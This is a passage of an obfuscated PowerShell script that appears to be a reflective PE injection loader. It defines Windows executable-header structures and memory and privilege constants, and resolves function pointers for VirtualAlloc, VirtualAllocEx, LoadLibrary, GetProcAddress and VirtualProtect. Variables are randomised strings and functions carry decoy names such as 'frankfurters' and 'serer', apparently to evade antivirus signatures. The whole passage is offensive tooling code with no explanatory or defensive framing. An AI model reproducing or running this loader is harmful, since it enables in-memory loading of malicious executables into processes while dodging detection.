        $oUBRQwDZ99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $OdLSekLe99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $OdLSekLe99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_OPTIONAL_HEADER64', $mvduPRIu99, [System.ValueType], 240)
        ($oUBRQwDZ99.DefineField('Magic', $OcjgusFv99, 'Public')).SetOffset(0) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($oUBRQwDZ99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($oUBRQwDZ99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($oUBRQwDZ99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($oUBRQwDZ99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($oUBRQwDZ99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($oUBRQwDZ99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($oUBRQwDZ99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($oUBRQwDZ99.DefineField('Subsystem', $qCMxMxDQ99, 'Public')).SetOffset(68) | Out-Null
        ($oUBRQwDZ99.DefineField('DllCharacteristics', $npuTqXAq99, 'Public')).SetOffset(70) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($oUBRQwDZ99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($oUBRQwDZ99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($oUBRQwDZ99.DefineField('ExportTable', $RORaVCky99, 'Public')).SetOffset(112) | Out-Null
        ($oUBRQwDZ99.DefineField('ImportTable', $RORaVCky99, 'Public')).SetOffset(120) | Out-Null
        ($oUBRQwDZ99.DefineField('ResourceTable', $RORaVCky99, 'Public')).SetOffset(128) | Out-Null
        ($oUBRQwDZ99.DefineField('ExceptionTable', $RORaVCky99, 'Public')).SetOffset(136) | Out-Null
        ($oUBRQwDZ99.DefineField('CertificateTable', $RORaVCky99, 'Public')).SetOffset(144) | Out-Null
        ($oUBRQwDZ99.DefineField('BaseRelocationTable', $RORaVCky99, 'Public')).SetOffset(152) | Out-Null
        ($oUBRQwDZ99.DefineField('Debug', $RORaVCky99, 'Public')).SetOffset(160) | Out-Null
        ($oUBRQwDZ99.DefineField('Architecture', $RORaVCky99, 'Public')).SetOffset(168) | Out-Null
        ($oUBRQwDZ99.DefineField('GlobalPtr', $RORaVCky99, 'Public')).SetOffset(176) | Out-Null
        ($oUBRQwDZ99.DefineField('TLSTable', $RORaVCky99, 'Public')).SetOffset(184) | Out-Null
        ($oUBRQwDZ99.DefineField('LoadConfigTable', $RORaVCky99, 'Public')).SetOffset(192) | Out-Null
        ($oUBRQwDZ99.DefineField('BoundImport', $RORaVCky99, 'Public')).SetOffset(200) | Out-Null
        ($oUBRQwDZ99.DefineField('IAT', $RORaVCky99, 'Public')).SetOffset(208) | Out-Null
        ($oUBRQwDZ99.DefineField('DelayImportDescriptor', $RORaVCky99, 'Public')).SetOffset(216) | Out-Null
        ($oUBRQwDZ99.DefineField('CLRRuntimeHeader', $RORaVCky99, 'Public')).SetOffset(224) | Out-Null
        ($oUBRQwDZ99.DefineField('Reserved', $RORaVCky99, 'Public')).SetOffset(232) | Out-Null
        $KKcbsPKP99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $KKcbsPKP99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_OPTIONAL_HEADER32', $mvduPRIu99, [System.ValueType], 224)
        ($oUBRQwDZ99.DefineField('Magic', $OcjgusFv99, 'Public')).SetOffset(0) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($oUBRQwDZ99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($oUBRQwDZ99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($oUBRQwDZ99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($oUBRQwDZ99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($oUBRQwDZ99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($oUBRQwDZ99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($oUBRQwDZ99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($oUBRQwDZ99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($oUBRQwDZ99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($oUBRQwDZ99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($oUBRQwDZ99.DefineField('Subsystem', $qCMxMxDQ99, 'Public')).SetOffset(68) | Out-Null
        ($oUBRQwDZ99.DefineField('DllCharacteristics', $npuTqXAq99, 'Public')).SetOffset(70) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($oUBRQwDZ99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($oUBRQwDZ99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($oUBRQwDZ99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($oUBRQwDZ99.DefineField('ExportTable', $RORaVCky99, 'Public')).SetOffset(96) | Out-Null
        ($oUBRQwDZ99.DefineField('ImportTable', $RORaVCky99, 'Public')).SetOffset(104) | Out-Null
        ($oUBRQwDZ99.DefineField('ResourceTable', $RORaVCky99, 'Public')).SetOffset(112) | Out-Null
        ($oUBRQwDZ99.DefineField('ExceptionTable', $RORaVCky99, 'Public')).SetOffset(120) | Out-Null
        ($oUBRQwDZ99.DefineField('CertificateTable', $RORaVCky99, 'Public')).SetOffset(128) | Out-Null
        ($oUBRQwDZ99.DefineField('BaseRelocationTable', $RORaVCky99, 'Public')).SetOffset(136) | Out-Null
        ($oUBRQwDZ99.DefineField('Debug', $RORaVCky99, 'Public')).SetOffset(144) | Out-Null
        ($oUBRQwDZ99.DefineField('Architecture', $RORaVCky99, 'Public')).SetOffset(152) | Out-Null
        ($oUBRQwDZ99.DefineField('GlobalPtr', $RORaVCky99, 'Public')).SetOffset(160) | Out-Null
        ($oUBRQwDZ99.DefineField('TLSTable', $RORaVCky99, 'Public')).SetOffset(168) | Out-Null
        ($oUBRQwDZ99.DefineField('LoadConfigTable', $RORaVCky99, 'Public')).SetOffset(176) | Out-Null
        ($oUBRQwDZ99.DefineField('BoundImport', $RORaVCky99, 'Public')).SetOffset(184) | Out-Null
        ($oUBRQwDZ99.DefineField('IAT', $RORaVCky99, 'Public')).SetOffset(192) | Out-Null
        ($oUBRQwDZ99.DefineField('DelayImportDescriptor', $RORaVCky99, 'Public')).SetOffset(200) | Out-Null
        ($oUBRQwDZ99.DefineField('CLRRuntimeHeader', $RORaVCky99, 'Public')).SetOffset(208) | Out-Null
        ($oUBRQwDZ99.DefineField('Reserved', $RORaVCky99, 'Public')).SetOffset(216) | Out-Null
        $gTIVtisR99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $gTIVtisR99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_NT_HEADERS64', $mvduPRIu99, [System.ValueType], 264)
        $oUBRQwDZ99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('FileHeader', $OdLSekLe99, 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('OptionalHeader', $KKcbsPKP99, 'Public') | Out-Null
        $uNmvZcLa99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $uNmvZcLa99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_NT_HEADERS32', $mvduPRIu99, [System.ValueType], 248)
        $oUBRQwDZ99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('FileHeader', $OdLSekLe99, 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('OptionalHeader', $gTIVtisR99, 'Public') | Out-Null
        $byKaJWql99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $byKaJWql99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_DOS_HEADER', $mvduPRIu99, [System.ValueType], 64)
        $oUBRQwDZ99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $AjMozvjf99 = $oUBRQwDZ99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $gKCbcljV99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $fnThPQOl99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $vVuxoDkC99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($GBJsnDbA99, $gKCbcljV99, $fnThPQOl99, @([Int32] 4))
        $AjMozvjf99.SetCustomAttribute($vVuxoDkC99)

        $oUBRQwDZ99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $NJReSxLp99 = $oUBRQwDZ99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $gKCbcljV99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $vVuxoDkC99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($GBJsnDbA99, $gKCbcljV99, $fnThPQOl99, @([Int32] 10))
        $NJReSxLp99.SetCustomAttribute($vVuxoDkC99)

        $oUBRQwDZ99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $svhGSTae99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $svhGSTae99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_SECTION_HEADER', $mvduPRIu99, [System.ValueType], 40)

        $iCieOnYZ99 = $oUBRQwDZ99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $gKCbcljV99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $vVuxoDkC99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($GBJsnDbA99, $gKCbcljV99, $fnThPQOl99, @([Int32] 8))
        $iCieOnYZ99.SetCustomAttribute($vVuxoDkC99)

        $oUBRQwDZ99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $BEGGxUZR99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $BEGGxUZR99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_BASE_RELOCATION', $mvduPRIu99, [System.ValueType], 8)
        $oUBRQwDZ99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $kGDPLnbG99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $kGDPLnbG99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $mvduPRIu99, [System.ValueType], 20)
        $oUBRQwDZ99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $kPANVoFD99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $kPANVoFD99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_EXPORT_DIRECTORY', $mvduPRIu99, [System.ValueType], 40)
        $oUBRQwDZ99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('Base', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $hYfQvyWb99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $hYfQvyWb99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('LUID', $mvduPRIu99, [System.ValueType], 8)
        $oUBRQwDZ99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('LUID_AND_ATTRIBUTES', $mvduPRIu99, [System.ValueType], 12)
        $oUBRQwDZ99.DefineField('Luid', $LUID, 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $tmjTqagK99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $tmjTqagK99

        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('TOKEN_PRIVILEGES', $mvduPRIu99, [System.ValueType], 16)
        $oUBRQwDZ99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('Privileges', $tmjTqagK99, 'Public') | Out-Null
        $DzVvLEZZ99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $DzVvLEZZ99

        return $gbwmFOmN99
    }

    Function frankfurters
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function serer
    {
        $YokgFkKj99 = New-Object System.Object

        $XnuUtmLQ99 = bite kernel32.dll VirtualAlloc
        $SbpCSUTG99 = gentler @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $fahVDfgj99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XnuUtmLQ99, $SbpCSUTG99)
        $YokgFkKj99 | Add-Member NoteProperty -Name VirtualAlloc -Value $fahVDfgj99

        $ZPqwVKOF99 = bite kernel32.dll VirtualAllocEx
        $SiAnXLeh99 = gentler @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $KbXSqzSL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZPqwVKOF99, $SiAnXLeh99)
        $YokgFkKj99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $KbXSqzSL99

        $QtSbRATg99 = bite msvcrt.dll memcpy
        $UBQXHyGz99 = gentler @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $iduaCNYz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($QtSbRATg99, $UBQXHyGz99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $iduaCNYz99

        $IgdHWwDA99 = bite msvcrt.dll memset
        $PIxVoHdp99 = gentler @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $PkjKTbpF99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IgdHWwDA99, $PIxVoHdp99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name memset -Value $PkjKTbpF99

        $EoLrIIvA99 = bite kernel32.dll LoadLibraryA
        $tSvzPJAJ99 = gentler @([String]) ([IntPtr])
        $ZItigOiC99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EoLrIIvA99, $tSvzPJAJ99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $ZItigOiC99

        $sBNkfTBY99 = bite kernel32.dll GetProcAddress
        $YpBBvgEP99 = gentler @([IntPtr], [String]) ([IntPtr])
        $Vqrhccgn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sBNkfTBY99, $YpBBvgEP99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $Vqrhccgn99

        $AFhpUHcz99 = bite kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $fHoDtrhN99 = gentler @([IntPtr], [IntPtr]) ([IntPtr])
        $CgbWnUnq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AFhpUHcz99, $fHoDtrhN99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $CgbWnUnq99

        $uLksjiBD99 = bite kernel32.dll VirtualFree
        $OfSXVOdq99 = gentler @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $xzQcuohp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($uLksjiBD99, $OfSXVOdq99)
        $YokgFkKj99 | Add-Member NoteProperty -Name VirtualFree -Value $xzQcuohp99

        $XgGQwBLD99 = bite kernel32.dll VirtualFreeEx
        $HwnhoIZu99 = gentler @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $joyaPOnc99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XgGQwBLD99, $HwnhoIZu99)
        $YokgFkKj99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $joyaPOnc99

        $JCpnoHGn99 = bite kernel32.dll VirtualProtect
        $ldSmHfSY99 = gentler @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $MDPqOBWC99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JCpnoHGn99, $ldSmHfSY99)
        $YokgFkKj99 | Add-Member NoteProperty -Name VirtualProtect -Value $MDPqOBWC99

        $BolZvzMi99 = bite kernel32.dll GetModuleHandleA
        $UzbIubFy99 = gentler @([String]) ([IntPtr])
        $sBXiWhZq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BolZvzMi99, $UzbIubFy99)
        $YokgFkKj99 | Add-Member NoteProperty -Name GetModuleHandle -Value $sBXiWhZq99

        $XcWiekJq99 = bite kernel32.dll FreeLibrary
        $dQnHVVrX99 = gentler @([IntPtr]) ([Bool])
